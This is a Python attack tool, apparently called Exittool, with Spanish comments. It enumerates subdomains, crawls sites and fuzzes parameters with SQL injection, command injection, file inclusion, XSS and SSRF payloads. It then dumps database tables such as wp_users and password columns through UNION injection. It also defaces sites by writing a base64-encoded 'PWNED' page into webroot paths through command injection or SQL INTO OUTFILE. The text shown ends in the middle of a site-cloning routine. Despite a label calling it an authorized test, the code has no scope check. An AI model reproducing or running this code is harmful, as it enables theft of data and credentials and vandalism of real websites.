#!/usr/bin/env python3
"""
Exittool v7.1 - Pentest Ofensivo Real con ataque a subdominios
Corrección de errores y mejoras de rendimiento.
pip install requests beautifulsoup4
"""

import requests
import sys
import time
import random
import argparse
import socket
import os
import re
import base64
import threading
import logging
import glob
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from bs4 import BeautifulSoup
from collections import deque

# Suprimir warnings de SSL inseguros
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.WARNING, format='[DEBUG] %(message)s')

TIMEOUT = 10
MAX_HILOS = 15
MAX_PAGINAS = 150


class Exittool:
    def __init__(self, target, wordlist=None, subdominios_list=None, threads=10, delay=0, proxy=None, out="exittool_output"):
        # Validar que el target tenga protocolo
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        self.target = target.rstrip('/')
        self.dominio = urlparse(self.target).netloc.split(':')[0]
        self.wordlist_path = wordlist
        self.subdominios_path = subdominios_list
        self.threads = min(threads, MAX_HILOS)
        self.delay = delay / 1000.0
        self.out = out
        self._proxy = proxy

        self._lock = threading.Lock()

        # Resultados globales
        self.vulns = []
        self.params_sqli = []
        self.params_cmd = []
        self.params_lfi = []
        self.params_xss = []
        self.params_ssrf = []
        self.tablas_extraidas = {}
        self.paginas_clonadas = []
        self.deface_ok = False
        self.urls_descubiertas = []
        self.urls_dinamicas = []
        self.subdominios_encontrados = []
        self.sitios_procesados = []  # Todos los sitios (dominio + subdominios)

        # Baselines por URL (solo metadatos, no texto completo)
        self.baselines = {}

        self.ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        ]

        if wordlist:
            self._cargar_lista('wordlist', wordlist)
        if subdominios_list:
            self._cargar_lista('subdominios_lista', subdominios_list)

    def _cargar_lista(self, nombre, ruta):
        try:
            with open(ruta, 'r', encoding='utf-8', errors='ignore') as f:
                lista = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            setattr(self, nombre, lista)
            print(f"  [ℹ️] {nombre}: {len(lista)} líneas")
        except Exception as e:
            print(f"  [-] Error cargando {ruta}: {e}")
            setattr(self, nombre, [])

    def _s(self):
        """Crear una sesión reutilizable con headers y proxy configurados."""
        s = requests.Session()
        s.headers['User-Agent'] = random.choice(self.ua_list)
        s.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        s.headers['Accept-Language'] = 'en-US,en;q=0.9'
        s.verify = False  # No verificar SSL (para pentesting)
        if self._proxy:
            s.proxies = {'http': self._proxy, 'https': self._proxy}
        return s

    def _get(self, url, params=None, timeout=TIMEOUT):
        """Petición GET con timeout y manejo de errores robusto."""
        try:
            return self._s().get(url, params=params, timeout=timeout, allow_redirects=True)
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.RequestException:
            pass
        except Exception:
            pass
        return None

    def _getp(self, url, param, value, timeout=TIMEOUT):
        """Petición GET con un parámetro específico inyectado."""
        try:
            s = self._s()
            if '?' not in url:
                return s.get(url, params={param: value}, timeout=timeout, verify=False)
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [value]
            nueva = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return s.get(nueva, timeout=timeout, verify=False)
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.RequestException:
            pass
        except Exception:
            pass
        return None

    def _establecer_baseline(self, url):
        """Establece baseline de una URL guardando solo metadatos esenciales."""
        if url in self.baselines:
            return self.baselines[url]
        r = self._get(url)
        if r:
            self.baselines[url] = {
                'len': len(r.content),
                'status': r.status_code,
                'elapsed': r.elapsed.total_seconds() if hasattr(r, 'elapsed') else 0,
            }
            return self.baselines[url]
        return None

    def _fmt(self, b):
        for u in ['B', 'KB', 'MB', 'GB']:
            if b < 1024:
                return f"{b:.1f}{u}"
            b /= 1024
        return f"{b:.1f}TB"

    def _progreso(self, actual, total, msg=""):
        if total == 0:
            return
        pct = min(int(actual / total * 100), 100)
        barra = '█' * (pct // 5) + '░' * (20 - pct // 5)
        print(f"\r  [{barra}] {pct}% {msg}", end='', file=sys.stderr)
        sys.stderr.flush()

    def _log_vuln(self, url, param, payload, categoria, conf, indicadores):
        vuln = {
            'url': url, 'param': param, 'payload': payload,
            'cat': categoria, 'conf': conf, 'ind': indicadores,
            'time': datetime.now().isoformat()
        }
        with self._lock:
            self.vulns.append(vuln)
            if conf == 'alta':
                if categoria == 'sqli':
                    self.params_sqli.append((url, param))
                elif categoria == 'cmd':
                    self.params_cmd.append((url, param))
                elif categoria == 'lfi':
                    self.params_lfi.append((url, param))
                elif categoria == 'xss':
                    self.params_xss.append((url, param))
                elif categoria == 'ssrf':
                    self.params_ssrf.append((url, param))

        icono = {'alta': '🔴', 'media': '🟡', 'baja': '🟢'}.get(conf, '⚪')
        print(f"\n  {icono} [{conf.upper()}] {categoria.upper()} en {url[:100]}")
        print(f"       Param: {param} | {indicadores[0]}")
        if conf == 'alta':
            print(f"       Payload: {payload[:80]}")

    # =====================================================================
    # 1. SUBDOMINIOS (corregido: paralelizado con threads)
    # =====================================================================

    def escanear_subdominios(self):
        """Escanea subdominios en paralelo usando ThreadPoolExecutor."""
        print(f"\n{'='*60}")
        print(f"  SUBDOMINIOS")
        print(f"{'='*60}")

        if not hasattr(self, 'subdominios_lista') or not self.subdominios_lista:
            # Lista corregida sin duplicados
            self.subdominios_lista = list(dict.fromkeys([
                'www', 'mail', 'ftp', 'admin', 'blog', 'shop', 'api', 'dev', 'test',
                'webmail', 'cpanel', 'whm', 'ns1', 'ns2', 'mx', 'smtp', 'pop3',
                'imap', 'vpn', 'gitlab', 'jenkins', 'jira', 'confluence', 'wiki',
                'foro', 'ayuda', 'soporte', 'intranet', 'portal', 'login', 'register',
                'adminer', 'phpmyadmin', 'pma', 'panel', 'estadisticas',
                'descargas', 'download', 'files', 'file', 'upload', 'subir',
                'backup', 'respaldos', 'db', 'database', 'mysql', 'mariadb',
                'monitor', 'monitoreo', 'status', 'estado', 'health', 'healthcheck',
                'app', 'aplicacion', 'mobile', 'm', 'movil',
                'staging', 'stage', 'qa', 'quality', 'testing', 'pruebas',
                'old', 'antiguo', 'v1', 'v2', 'version', 'versiones',
                'server', 'servidor', 'host', 'hosting', 'cloud', 'nube',
                'socket', 'ws', 'wss', 'stream', 'streaming',
                'cdn', 'static', 'estatico', 'assets', 'recursos',
                'correo', 'email',
                'proxy', 'gateway', 'pasarela',
                'analytics', 'analitica', 'tracking', 'rastreo',
                'store', 'tienda', 'community', 'docs', 'help',
                'support', 'tickets', 'billing', 'store', 'client',
                'member', 'partner', 'media', 'video', 'audio',
                'player', 'radio', 'tv', 'live', 'news', 'press',
                'about', 'legal', 'privacy', 'terms', 'cookies',
            ]))

        partes = self.dominio.split('.')
        if len(partes) >= 2:
            dominio_base = '.'.join(partes[-2:])
        else:
            dominio_base = self.dominio

        encontrados = []
        total = len(self.subdominios_lista)

        def _probar_sub(sub):
            """Prueba un subdominio con HTTPS y HTTP."""
            result = None
            for protocolo in ['https', 'http']:
                url = f"{protocolo}://{sub}.{dominio_base}"
                try:
                    ip = socket.gethostbyname(f"{sub}.{dominio_base}")
                    r = self._get(url, timeout=3)
                    if r:
                        status = r.status_code
                        entry = f"{url} ({ip}) [{status}]"
                        return (url, ip, status, entry)
                except Exception:
                    pass
            return None

        print(f"  Escaneando {total} subdominios con {min(self.threads, 30)} hilos...")
        with ThreadPoolExecutor(max_workers=min(self.threads, 30)) as pool:
            futuros = {pool.submit(_probar_sub, sub): sub for sub in self.subdominios_lista}
            for i, futuro in enumerate(as_completed(futuros)):
                try:
                    resultado = futuro.result()
                    if resultado:
                        url, ip, status, entry = resultado
                        if entry not in encontrados:
                            encontrados.append(entry)
                            self.subdominios_encontrados.append(url)
                            print(f"\n  [✅] {url} → {ip} (HTTP {status})")
                except Exception:
                    pass
                if (i + 1) % 50 == 0:
                    self._progreso(i + 1, total, f"{len(encontrados)} encontrados")

        print(f"\n  [✅] Subdominios encontrados: {len(self.subdominios_encontrados)}")
        for s in self.subdominios_encontrados[:10]:
            print(f"      • {s}")

        return self.subdominios_encontrados

    # =====================================================================
    # 2. RECONOCIMIENTO
    # =====================================================================

    def reconocer(self, url=None):
        """Reconocimiento de un sitio específico o del principal."""
        if url is None:
            url = self.target

        print(f"\n{'='*60}")
        print(f"  RECONOCIMIENTO: {url[:80]}")
        print(f"{'='*60}")

        dominio = urlparse(url).netloc.split(':')[0]
        print(f"  URL: {url}")
        print(f"  Dominio: {dominio}")

        try:
            ip = socket.gethostbyname(dominio)
            print(f"  IP: {ip}")
        except Exception:
            print(f"  IP: No resuelto")

        r = self._get(url)
        if r:
            # Detectar WAF o rate limiting
            if r.status_code == 403:
                print(f"  [⚠️] WAF detectado (403 Forbidden)")
            elif r.status_code == 429:
                print(f"  [⚠️] Rate limiting detectado (429 Too Many Requests)")

            print(f"  Status: {r.status_code}")
            print(f"  Tamaño: {self._fmt(len(r.content))}")
            print(f"  Server: {r.headers.get('Server', '?')}")
            print(f"  CMS: ", end='')
            if 'wp-content' in r.text or 'wp-includes' in r.text:
                print("WordPress")
            elif 'joomla' in r.text.lower():
                print("Joomla")
            elif 'drupal' in r.text.lower():
                print("Drupal")
            elif 'Magento' in r.text or 'magento' in r.text.lower():
                print("Magento")
            elif 'prestashop' in r.text.lower():
                print("PrestaShop")
            else:
                print("Desconocido/Personalizado")

            self._establecer_baseline(url)
            return True

        print(f"  [-] No responde")
        return False

    # =====================================================================
    # 3. CRAWLER (corregido: mejor validación de URLs)
    # =====================================================================

    def crawlear(self, url_base=None, max_paginas=MAX_PAGINAS, profundidad=2):
        """Crawlea un sitio y descubre URLs dinámicas."""
        if url_base is None:
            url_base = self.target

        # Validar que la URL sea válida
        parsed = urlparse(url_base)
        if not parsed.scheme or not parsed.netloc:
            print(f"  [-] URL inválida: {url_base}")
            return

        print(f"\n  [🕷️] Crawleando: {url_base[:80]}")

        visitadas = set()
        cola = deque()
        cola.append((url_base, 0))
        urls = set()
        dinamicas = set()

        while cola and len(visitadas) < max_paginas:
            url, prof = cola.popleft()
            url = url.split('#')[0].rstrip('/')
            if url in visitadas or prof > profundidad:
                continue

            # Validar esquema de la URL
            try:
                p = urlparse(url)
                if p.scheme not in ('http', 'https'):
                    continue
                if not p.netloc:
                    continue
            except Exception:
                continue

            visitadas.add(url)

            r = self._get(url, timeout=5)
            if not r:
                continue

            urls.add(url)
            if '?' in url:
                dinamicas.add(url)

            try:
                soup = BeautifulSoup(r.text, 'html.parser')
                dominio_actual = urlparse(url_base).netloc.split(':')[0]

                for a in soup.find_all('a', href=True):
                    href = a['href'].split('#')[0]
                    if not href or href.startswith(('javascript:', 'mailto:', 'tel:', 'data:')):
                        continue
                    abs_url = urljoin(url, href)
                    # Solo seguir enlaces del mismo dominio
                    if dominio_actual in abs_url:
                        norm = abs_url.rstrip('/')
                        if norm not in visitadas:
                            cola.append((norm, prof + 1))

                for form in soup.find_all('form', method=lambda x: not x or x.lower() == 'get'):
                    action = form.get('action', '')
                    action_url = urljoin(url, action)
                    inputs = form.find_all(['input', 'select', 'textarea'])
                    params = [i.get('name') for i in inputs if i.get('name')]
                    if params:
                        qs = '&'.join([f"{p}=test" for p in params[:5]])
                        dinamicas.add(f"{action_url}?{qs}")
            except Exception:
                continue

        for u in urls:
            self.urls_descubiertas.append(u)
        for d in dinamicas:
            self.urls_dinamicas.append(d)

        print(f"      URLs: {len(urls)} | Dinámicas: {len(dinamicas)}")
        for u in list(dinamicas)[:8]:
            print(f"        • {u[:120]}")

    # =====================================================================
    # 4. FUZZING (corregido: mejor manejo de parámetros)
    # =====================================================================

    def fuzzear(self, url_base=None, intensidad='alta'):
        """Fuzzea URLs de un sitio específico o todos."""
        if url_base:
            urls_a_fuzz = [url_base]
            dominio = urlparse(url_base).netloc.split(':')[0]
            extras = [u for u in self.urls_dinamicas if dominio in u]
            urls_a_fuzz.extend(extras[:10])
        else:
            urls_a_fuzz = []
            if self.urls_dinamicas:
                urls_a_fuzz = self.urls_dinamicas[:20]
            else:
                urls_a_fuzz = [self.target]

        dominio_actual = urlparse(urls_a_fuzz[0]).netloc.split(':')[0] if urls_a_fuzz else self.dominio
        print(f"\n{'='*60}")
        print(f"  FUZZING: {dominio_actual} ({len(urls_a_fuzz)} URLs)")
        print(f"{'='*60}")

        for url in urls_a_fuzz:
            self._establecer_baseline(url)

        # Recolectar parámetros de URLs dinámicas
        todos_params = set()
        for url in urls_a_fuzz:
            if '?' in url:
                try:
                    qs_part = url.split('?', 1)[1]
                    for p in qs_part.split('&'):
                        if '=' in p:
                            todos_params.add(p.split('=', 1)[0])
                except Exception:
                    pass

        if not todos_params:
            todos_params = {
                'id', 'page', 'file', 'cat', 'post', 'product', 'article', 'view',
                'option', 'task', 'do', 'q', 'search', 's', 'name', 'dir', 'path',
                'include', 'template', 'pag', 'mod', 'seccion', 'section', 'lang',
                'language', 'ref', 'redirect'
            }

        print(f"  Parámetros: {', '.join(list(todos_params)[:12])}")

        payloads = self._payloads()
        hechos = 0
        inicio = time.time()
        MAX_TESTS = 400

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futuros = {}
            for url in urls_a_fuzz:
                for param in list(todos_params)[:8]:
                    for cat, lista in payloads.items():
                        for pay in lista[:3]:
                            if hechos >= MAX_TESTS:
                                break
                            f = ex.submit(self._probar, url, param, pay, cat)
                            futuros[f] = (url, param, cat, pay)
                            hechos += 1
                        if hechos >= MAX_TESTS:
                            break
                    if hechos >= MAX_TESTS:
                        break
                if hechos >= MAX_TESTS:
                    break

            for f in as_completed(futuros):
                try:
                    f.result(timeout=TIMEOUT + 2)
                except Exception:
                    pass

                if time.time() - inicio > 120:
                    print(f"\n  [!] Timeout fuzzing {dominio_actual}")
                    break

        reales = len([v for v in self.vulns if v['conf'] == 'alta' and dominio_actual in v.get('url', '')])
        print(f"\n  ✅ Tests: {hechos} | Reales en {dominio_actual}: {reales}")

    def _payloads(self):
        return {
            'sqli': [
                "'", "\"", "' OR '1'='1", "' AND 1=1--", "' AND SLEEP(2)--",
                "' UNION SELECT 1,2,3--", "' AND 1=2--"
            ],
            'cmd': [
                ";id", "|id", "`id`", "$(id)", ";sleep 2", "|ping -c 2 127.0.0.1"
            ],
            'lfi': [
                "/etc/passwd", "../../../etc/passwd", "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index"
            ],
            'xss': [
                "<script>alert(1)</script>", "\"><script>alert(1)</script>",
                "' onfocus='alert(1)' autofocus='"
            ],
            'ssrf': [
                "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/"
            ],
        }

    def _probar(self, url, param, payload, categoria):
        """Prueba un payload contra un parámetro de una URL."""
        if self.delay:
            time.sleep(self.delay)

        baseline = self.baselines.get(url)
        inicio = time.time()
        r = self._getp(url, param, payload)
        if not r:
            return
        elapsed = r.elapsed.total_seconds() if hasattr(r, 'elapsed') else time.time() - inicio

        content = r.text
        lower = content.lower()
        indicadores = []
        conf = 'baja'

        if categoria == 'sqli':
            errores_sql = [
                (r"you have an error in your sql syntax", "Error SQL sintaxis"),
                (r"warning:\s*mysql", "Warning MySQL"),
                (r"unclosed quotation mark", "Comilla sin cerrar"),
                (r"mysql_fetch", "Error MySQL fetch"),
                (r"ora-\d{5}", "Error Oracle"),
                (r"postgresql.*error", "Error PostgreSQL"),
                (r"sqlite.*error", "Error SQLite"),
                (r"odbc.*error", "Error ODBC"),
                (r"microsoft.*ole db.*error", "Error MS OLE DB"),
                (r"sqlstate", "SQLState error"),
                (r"driver.*error", "Error driver"),
                (r"supplied argument is not a valid", "Argumento inválido"),
                (r"column.*not found", "Columna no encontrada"),
                (r"table.*doesn't exist", "Tabla no existe"),
                (r"unknown column", "Columna desconocida"),
            ]
            for patron, mensaje in errores_sql:
                if re.search(patron, lower):
                    indicadores.append(f"Error SQL: {mensaje}")
                    conf = 'alta'
                    break

            if not indicadores and elapsed > 3 and 'sleep' in payload.lower():
                r_normal = self._getp(url, param, "' AND 1=1--")
                if r_normal:
                    try:
                        elapsed_normal = r_normal.elapsed.total_seconds() if hasattr(r_normal, 'elapsed') else 1.0
                        if elapsed > elapsed_normal * 2:
                            indicadores.append(f"Time-based SQLi: {elapsed:.1f}s")
                            conf = 'alta'
                    except Exception:
                        pass

            if not indicadores and 'AND 1=1' in payload:
                p2 = payload.replace('AND 1=1', 'AND 1=2')
                r2 = self._getp(url, param, p2)
                if r2 and baseline:
                    diff = abs(len(r2.content) - len(r.content))
                    if diff > 100:
                        indicadores.append(f"Blind SQLi: diff {diff}b")
                        conf = 'alta'

            if not indicadores and 'UNION' in payload and baseline:
                diff = abs(len(r.content) - baseline['len'])
                if diff > 200:
                    indicadores.append(f"UNION SQLi: respuesta alterada +{diff}b")
                    conf = 'alta'

        elif categoria == 'cmd':
            markers = [
                (r"root:x:0:0:", "/etc/passwd expuesto"),
                (r"uid=\d+\([a-z_]+\)", "UID visible"),
                (r"total \d+", "Listado directorio"),
                (r"drwx[rwxs-]{9}", "Permisos visibles"),
                (r"bin/", "Directorios sistema"),
                (r"etc/passwd", "Passwd en output"),
            ]
            for patron, mensaje in markers:
                if re.search(patron, lower):
                    indicadores.append(f"CMD ejecutado: {mensaje}")
                    conf = 'alta'
                    break

            # Detección time-based para CMD
            if not indicadores and elapsed > 3 and ('sleep' in payload.lower() or 'ping' in payload.lower()):
                r_normal = self._getp(url, param, ";echo a")
                if r_normal:
                    try:
                        elapsed_normal = r_normal.elapsed.total_seconds() if hasattr(r_normal, 'elapsed') else 1.0
                        if elapsed > elapsed_normal * 2:
                            indicadores.append(f"Time-based CMD: {elapsed:.1f}s")
                            conf = 'alta'
                    except Exception:
                        pass

        elif categoria == 'lfi':
            if 'root:x:' in lower and 'passwd' in payload:
                indicadores.append("/etc/passwd EXPUESTO")
                conf = 'alta'
            elif '<?php' in content[:500] and 'base64' in payload:
                indicadores.append("Código fuente PHP expuesto")
                conf = 'alta'
            elif '[extensions]' in content and 'win.ini' in payload.lower():
                indicadores.append("win.ini expuesto (Windows)")
                conf = 'alta'

        elif categoria == 'xss':
            payload_limpio = re.sub(r'<[^>]*>', '', payload)
            if payload_limpio in content:
                indicadores.append("Payload reflectado sin sanitizar")
                conf = 'media'
            # Verificar si el script se ejecuta en contexto
            if '<script>' in lower and 'alert' in lower:
                conf = 'alta'
                indicadores = ["XSS reflectado - contexto script"]
            elif 'onfocus' in lower and 'alert' in lower:
                conf = 'alta'
                indicadores = ["XSS reflectado - event handler"]

        elif categoria == 'ssrf':
            if elapsed > 6:
                indicadores.append(f"SSRF potencial: {elapsed:.1f}s")
                conf = 'media'

        if indicadores:
            self._log_vuln(url, param, payload, categoria, conf, indicadores)

    # =====================================================================
    # 5. EXTRACCIÓN BD
    # =====================================================================

    def extraer_bd(self, url_base=None):
        """Extrae BD de un sitio específico o de todos."""
        print(f"\n{'='*60}")
        print(f"  EXTRACCIÓN BD")
        print(f"{'='*60}")

        # Filtrar vectores por dominio si se especifica
        vectores = self.params_sqli
        if url_base:
            dominio = urlparse(url_base).netloc.split(':')[0]
            vectores = [(u, p) for u, p in vectores if dominio in u]

        if not vectores:
            print("  [-] No hay SQLi para extraer")
            return False

        os.makedirs(self.out, exist_ok=True)

        for idx, (url, param) in enumerate(vectores[:3]):
            dominio_actual = urlparse(url).netloc.split(':')[0]
            print(f"\n  [🎯] [{dominio_actual}] SQLi: {url[:80]}?{param}=")

            # Detectar columnas con ORDER BY
            cols = None
            for n in range(1, 20):
                r = self._getp(url, param, f"' ORDER BY {n}--")
                if r and r.status_code == 200:
                    continue
                else:
                    cols = n - 1 if n > 1 else None
                    break

            if not cols:
                for n in range(1, 20):
                    nulls = ','.join(['NULL'] * n)
                    r = self._getp(url, param, f"' UNION SELECT {nulls}--")
                    if r and r.status_code == 200:
                        baseline = self.baselines.get(url)
                        if baseline and abs(len(r.content) - baseline['len']) > 50:
                            cols = n
                            break

            if not cols:
                print("  [-] No se detectaron columnas")
                continue

            print(f"  [✅] Columnas: {cols}")

            # Información básica
            for nombre, q_part in [("Version", "@@version"), ("DB", "database()"), ("User", "user()")]:
                if cols > 1:
                    q = f"' UNION SELECT {q_part},{','.join(['NULL'] * (cols - 1))}--"
                else:
                    q = f"' UNION SELECT {q_part}--"
                r = self._getp(url, param, q)
                if r:
                    try:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        texto = soup.get_text()
                        orig = BeautifulSoup(self.baselines.get(url, {}).get('text', ''), 'html.parser').get_text()
                        for l in texto.split('\n'):
                            l = l.strip()
                            if l and len(l) > 2 and l not in orig and 'NULL' not in l:
                                print(f"    • {nombre}: {l[:120]}")
                                break
                    except Exception:
                        pass

            # Listar tablas
            if cols > 1:
                q = f"' UNION SELECT group_concat(table_name),{','.join(['NULL'] * (cols - 1))} FROM information_schema.tables WHERE table_schema=database()--"
            else:
                q = f"' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--"
            r = self._getp(url, param, q)
            tablas = []
            if r:
                try:
                    soup = BeautifulSoup(r.text, 'html.parser')
                    texto = soup.get_text()
                    orig = BeautifulSoup(self.baselines.get(url, {}).get('text', ''), 'html.parser').get_text()
                    for l in texto.split('\n'):
                        l = l.strip()
                        if len(l) > 5 and l not in orig:
                            tablas = [t.strip() for t in l.split(',') if t.strip() and not t.startswith('NULL')]
                            break
                except Exception:
                    pass

            if not tablas:
                if 'wp_' in str(self.baselines):
                    tablas = ['wp_users', 'wp_usermeta', 'wp_options', 'wp_posts', 'wp_comments']
                else:
                    tablas = ['users', 'admin', 'accounts', 'usuarios', 'clientes', 'config', 'settings', 'posts', 'pages']
                print(f"  [⚠️] Tablas por defecto")
            else:
                print(f"  [📋] Tablas ({len(tablas)}): {', '.join(tablas[:10])}")

            # Extraer datos
            for tabla in tablas[:6]:
                filas = self._extraer_tabla(url, param, cols, tabla)
                if filas:
                    pass  # Ya se imprime dentro

        # Guardar todo
        if self.tablas_extraidas:
            ruta = f"{self.out}/BD_extraida.txt"
            total = sum(len(d['filas']) for d in self.tablas_extraidas.values())
            with open(ruta, 'w', encoding='utf-8') as f:
                f.write(f"BD EXTRAÍDA - {self.target}\n{datetime.now()}\n{'='*50}\n\n")
                for t, d in self.tablas_extraidas.items():
                    f.write(f"\n[Tabla: {t}] ({len(d['filas'])} filas)\n")
                    f.write(f"Columnas: {', '.join(d['columnas'])}\n")
                    f.write("-" * 40 + "\n")
                    for fila in d['filas'][:100]:
                        f.write(f"{fila}\n")
            print(f"\n  [💾] BD guardada: {ruta} ({total} registros)")
            return True

        return False

    def _extraer_tabla(self, url, param, cols, tabla):
        """Extrae columnas y datos de una tabla."""
        # Escapar nombre de tabla para evitar inyección en el nombre
        tabla_segura = re.sub(r'[^a-zA-Z0-9_]', '', tabla)
        if not tabla_segura:
            return []

        if cols > 1:
            q = f"' UNION SELECT group_concat(column_name),{','.join(['NULL'] * (cols - 1))} FROM information_schema.columns WHERE table_name='{tabla_segura}'--"
        else:
            q = f"' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{tabla_segura}'--"
        r = self._getp(url, param, q)
        columnas = []
        if r:
            try:
                soup = BeautifulSoup(r.text, 'html.parser')
                texto = soup.get_text()
                orig = BeautifulSoup(self.baselines.get(url, {}).get('text', ''), 'html.parser').get_text()
                for l in texto.split('\n'):
                    l = l.strip()
                    if len(l) > 5 and l not in orig:
                        columnas = [c.strip() for c in l.split(',') if c.strip()][:5]
                        break
            except Exception:
                pass

        if not columnas:
            if tabla.startswith('wp_'):
                columnas = {
                    'wp_users': ['user_login', 'user_pass', 'user_email', 'display_name'],
                    'wp_usermeta': ['user_id', 'meta_key', 'meta_value'],
                    'wp_options': ['option_name', 'option_value'],
                    'wp_posts': ['post_title', 'post_content', 'post_author'],
                    'wp_comments': ['comment_author', 'comment_content', 'comment_author_ip']
                }.get(tabla_segura, ['id', 'name', 'value'])
            else:
                columnas = ['id', 'username', 'password', 'email', 'name']

        sep = "||0x3a||"
        cols_sel = sep.join(columnas[:3])
        if cols > 1:
            q = f"' UNION SELECT group_concat(0x0a,{cols_sel}),{','.join(['NULL'] * (cols - 1))} FROM {tabla_segura} LIMIT 100--"
        else:
            q = f"' UNION SELECT group_concat(0x0a,{cols_sel}) FROM {tabla_segura} LIMIT 100--"
        r = self._getp(url, param, q)

        filas = []
        if r:
            try:
                soup = BeautifulSoup(r.text, 'html.parser')
                texto = soup.get_text()
                orig = BeautifulSoup(self.baselines.get(url, {}).get('text', ''), 'html.parser').get_text()
                for l in texto.split('\n'):
                    l = l.strip()
                    if l and len(l) > 3 and l not in orig and 'NULL' not in l:
                        filas.append(l)
            except Exception:
                pass

        if filas:
            self.tablas_extraidas[f"{urlparse(url).netloc.split(':')[0]}.{tabla_segura}"] = {
                'columnas': columnas,
                'filas': filas[:100]
            }
            print(f"    • {tabla_segura}: {len(filas)} filas [{', '.join(columnas[:3])}]")
            for f_item in filas[:2]:
                print(f"        {f_item[:120]}")

        return filas

    # =====================================================================
    # 6. DEFACE (corregido: verificación con delay)
    # =====================================================================

    def defacear(self, url_base=None):
        """Deface un sitio específico o todos."""
        print(f"\n{'='*60}")
        print(f"  DEFACE")
        print(f"{'='*60}")

        vectores_cmd = self.params_cmd
        vectores_sqli = self.params_sqli

        if url_base:
            dominio = urlparse(url_base).netloc.split(':')[0]
            vectores_cmd = [(u, p) for u, p in vectores_cmd if dominio in u]
            vectores_sqli = [(u, p) for u, p in vectores_sqli if dominio in u]

        if not vectores_cmd and not vectores_sqli:
            print("  [-] No hay vectores para deface")
            return False

        html = self._html_deface()
        b64 = base64.b64encode(html.encode()).decode()

        rutas = [
            '/var/www/html/index.html', '/var/www/html/index.php',
            '/var/www/index.html', '/usr/local/apache2/htdocs/index.html',
            '/var/www/public/index.html', '/app/public/index.html',
        ]

        # VÍA 1: CMD
        if vectores_cmd:
            print("  [🐚] Via: Command Injection")
            for url, param in vectores_cmd:
                dominio_actual = urlparse(url).netloc.split(':')[0]
                for ruta in rutas:
                    self._getp(url, param, f";echo '{b64}'|base64 -d > {ruta}")
                    self._getp(url, param, f";printf '{b64}'|base64 -d > {ruta}")

                    # Esperar un momento para que el servidor procese
                    time.sleep(2)

                    # Verificar en el sitio correcto
                    sitio = f"https://{dominio_actual}" if 'https' in str(self.target) else f"http://{dominio_actual}"
                    r = self._get(sitio)
                    if r and 'PWNED-EXITTOOL' in r.text:
                        print(f"  [✅][✅] DEFACE EXITOSO: {sitio}")
                        self.deface_ok = True
                        os.makedirs(self.out, exist_ok=True)
                        with open(f"{self.out}/DEFACE_{dominio_actual}.txt", 'w') as f:
                            f.write(f"Deface exitoso via CMD\nURL: {sitio}\nPayload: echo base64 | base64 -d\n")
                        return True

        # VÍA 2: SQLi INTO OUTFILE
        if vectores_sqli and not self.deface_ok:
            print("  [🐬] Via: SQLi INTO OUTFILE")
            for url, param in vectores_sqli[:2]:
                dominio_actual = urlparse(url).netloc.split(':')[0]
                for ruta in rutas:
                    q = f"' UNION SELECT '{html}' INTO OUTFILE '{ruta}'--"
                    self._getp(url, param, q)

                    # Esperar un momento
                    time.sleep(2)

                    sitio = f"https://{dominio_actual}" if 'https' in str(self.target) else f"http://{dominio_actual}"
                    r = self._get(sitio)
                    if r and 'PWNED-EXITTOOL' in r.text:
                        print(f"  [✅] Deface via SQLi: {sitio}")
                        self.deface_ok = True
                        return True

        if not self.deface_ok:
            print("  [-] No se logró deface")

        return self.deface_ok

    def _html_deface(self):
        return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>PWNED-EXITTOOL</title>
<style>body{{background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:100px}}
h1{{font-size:4em;text-shadow:0 0 30px #0f0;animation:blink 2s infinite}}
.status{{border:2px solid #0f0;padding:30px;margin:20px auto;max-width:700px;background:#0a1a0a}}
@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:0.6}}}}
</style></head><body>
<h1>PWNED</h1>
<h2>EXITTOOL - PRUEBA AUTORIZADA</h2>
<div class="status">
<strong>SITIO COMPROMETIDO</strong><br><br>
Target: {self.target}<br>
Fecha: {datetime.now()}<br>
Herramienta: Exittool v7.1<br>
Pentester: Autorizado y Verificado
</div>
<p style="color:#666">Esta modificación fue realizada como parte de una prueba de penetración autorizada.</p>
</body></html>"""

    # =====================================================================
    # 7. CLONACIÓN (corregido: manejo de URLs relativas y CSS)
    # =====================================================================

    def clonar(self, url_base=None, max_paginas=80):
        """Clona un sitio específico o todos los descubiertos."""
        if url_base:
            sitios_a_clonar = [url_base]
        else:
            sitios_a_clonar = [self.target] + self.subdominios_encontrados

        print(f"\n{'='*60}")
        print(f"  CLONACIÓN - {len(sitios_a_clonar)} sitios")
        print(f"{'='*60}")

        for sitio in sitios_a_clonar[:5]:  # Máximo 5 sitios
            dominio = urlparse(sitio).netloc.split(':')[0]
            print(f"\n  [🕷️] Clonando: {sitio}")

            os.makedirs(f"{self.out}/clone/{dominio}/pages", exist_ok=True)
